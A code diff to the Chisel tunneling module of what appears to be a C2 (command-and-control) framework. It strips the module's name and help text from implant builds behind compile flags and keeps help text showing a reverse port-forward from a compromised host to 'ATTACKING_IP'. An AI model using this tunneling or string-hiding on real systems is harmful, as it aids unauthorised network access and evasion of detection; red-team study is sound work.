@@ -1,13 +1,18 @@
 #include "Chisel.hpp"
 
 #include <cstring>
-#include "Tools.hpp"
 
+#include "Common.hpp"
+#include "Tools.hpp"
 
 using namespace std;
 
-const std::string moduleName = "chisel";
+constexpr std::string_view moduleName = "chisel";
+constexpr unsigned long moduleHash = djb2(moduleName);
+
+#ifdef BUILD_TEAMSERVER
 const std::string ToolsDirectoryFromTeamServer = "../Tools/";
+#endif
 
 
 #define BUFSIZE 512
@@ -22,7 +27,11 @@ __declspec(dllexport) Chisel* A_ChiselConstructor()
 #endif
 
 Chisel::Chisel()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -33,6 +42,7 @@ Chisel::~Chisel()
 std::string Chisel::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "Chisel:\n";
 	info += "Launch chisel in a thread on the remote server.\n";
 	info += "No output is provided.\n";
@@ -45,12 +55,13 @@ std::string Chisel::getInfo()
 	info += "Remote Port Forward:\n";
 	info += "- chisel /tools/chisel.exe client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:REMOT_PORT\n";
 	info += "- On the attacking machine: chisel server -p LISTEN_PORT --reverse\n";
-
+#endif
 	return info;
 }
 
 int Chisel::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
+#if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
 	if (splitedCmd.size() == 2)
 	{
 		if(splitedCmd[1]=="status")
@@ -157,7 +168,7 @@ int Chisel::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 		c2Message.set_returnvalue(getInfo());
 		return -1;
 	}
-
+#endif
 	return 0;
 }
 
@@ -178,7 +189,7 @@ int Chisel::process(C2Message &c2Message, C2Message &c2RetMessage)
 		HANDLE hProc=OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
 		TerminateProcess(hProc,9);
 
-		c2RetMessage.set_instruction(m_name);
+		c2RetMessage.set_instruction(c2RetMessage.instruction());
 		c2RetMessage.set_pid(pid);
 		c2RetMessage.set_cmd("stop");
 
@@ -217,7 +228,7 @@ int Chisel::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #endif
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_pid(pid);
 	c2RetMessage.set_cmd(c2Message.cmd());
 	c2RetMessage.set_returnvalue(result);
